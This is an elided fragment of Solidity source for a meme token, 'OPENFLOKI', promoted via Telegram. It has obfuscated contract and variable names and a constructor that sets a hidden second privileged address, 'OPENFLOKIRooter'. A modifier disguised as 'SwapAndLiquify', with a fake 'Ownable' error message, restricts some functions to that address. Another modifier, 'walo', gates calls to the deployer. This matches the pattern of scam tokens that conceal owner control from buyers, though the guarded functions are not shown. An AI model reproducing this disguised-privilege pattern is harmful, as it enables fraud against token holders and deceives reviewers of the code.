...
/**
OPENFLOKI  $OPENFLOKI
https://t.me/OPENFLOKIToken
*/
pragma solidity 0.8.16;
abstract contract OPENFLOKIAs {
...
interface OPENFLOKIAsii is OPENFLOKIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract OPENFLOKIAsiii is OPENFLOKIAs {
...
contract OPENFLOKITOKEN is OPENFLOKIAs, OPENFLOKIAsi, OPENFLOKIAsii, OPENFLOKIAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public OPENFLOKIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private OPENFLOKIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public OPENFLOKIPaw;
  address OPENFLOKIAdr;



    
    constructor(address OPENFLOKIadressss) {
            // Editable
            OPENFLOKIAdr = msg.sender;

        _name = "OPENFLOKI";
        _symbol = "OPENFLOKI";
  OPENFLOKIRooter = OPENFLOKIadressss;        
        uint OPENFLOKITotalSupply = 200000000000 * 10**9;
        process(msg.sender, OPENFLOKITotalSupply);
    }
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(OPENFLOKIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(OPENFLOKIAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
